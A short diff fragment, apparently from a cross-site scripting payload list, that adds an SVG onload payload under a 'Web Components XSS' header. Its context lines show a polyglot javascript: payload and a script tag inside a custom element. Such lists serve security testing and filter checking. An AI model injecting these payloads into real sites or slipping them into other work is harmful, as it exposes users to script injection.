@@ -753,3 +753,4 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</
 
 # Web Components XSS
 <x-element><script>alert(1)</script></x-element>
+<svg/onload=alert(1)>
